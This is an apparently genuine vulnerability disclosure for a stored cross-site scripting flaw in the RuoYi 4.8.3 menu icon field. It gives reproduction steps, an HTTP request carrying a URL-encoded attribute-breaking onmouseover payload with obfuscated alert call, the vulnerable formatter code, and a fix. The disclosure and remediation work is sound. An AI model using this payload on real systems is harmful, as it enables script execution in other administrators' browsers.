# RuoYi menu icon attribute stored XSS

## Summary

RuoYi 4.8.3 contains stored cross-site scripting in the menu management list. The stored menu icon value is concatenated into an i-element class attribute by the page formatter without attribute encoding. A user with menu modification permission can inject an event handler that executes when another administrator views the menu list.

## Affected product

- Vendor/project: **yangzongzhuan**
- Product: **RuoYi**
- Affected version: **4.8.3**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (4.8)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

User with menu add/edit permission; victim opens menu management and interacts with the icon.

Verified flow: `menu icon field → /system/menu/list JSON → menu.html formatter → i.class attribute`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a menu item whose icon contains a quote-breaking event attribute.
2. Confirm the menu-list JSON returns the exact stored icon value.
3. Open the menu management list and hover the crafted icon.

Sanitized request shape used during verification:

```http
# User requires system:menu:add or system:menu:edit
POST <BASE_URL>/system/menu/add
Cookie: <SESSION_COOKIE>
Content-Type: application/x-www-form-urlencoded

menuName=gt48261022ic3
parentId=1&menuType=C&orderNum=99
url=/gt48261022ic3
icon=gt48261022ic3%22%20onmouseover%20%3D%20self%5B%22al%22%2B%22ert%22%5D%281%29%20x%3D%22
visible=1&status=0&isRefresh=1&target=&perms=

# Storage proof; opening /system/menu invokes the vulnerable formatter
POST <BASE_URL>/system/menu/list
Cookie: <SESSION_COOKIE>

url=/gt48261022ic3
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.


## Confirmed source and Sink

```text
menu.html:81-85
formatter: function(value, row, index) {
    if ($.common.isEmpty(row.icon)) {
        return row.menuName;
    } else {
        return '<i class="' + row.icon + '"></i> ' +
               '<span class="nav-label">' + row.menuName + '</span>';
    }
}
```

Root cause: The stored icon field is treated as a trusted CSS class and concatenated into an HTML attribute. The formatter result is inserted as HTML.

## Recommended remediation

Whitelist known icon class names and attribute-encode the selected value. Prefer DOM classList over HTML string construction.

## References

- Official source: https://github.com/yangzongzhuan/RuoYi/blob/master/ruoyi-admin/src/main/resources/templates/system/menu/menu.html

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-12 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-12/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-12 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-12/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-12 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-12/03-source-github-v3.png)
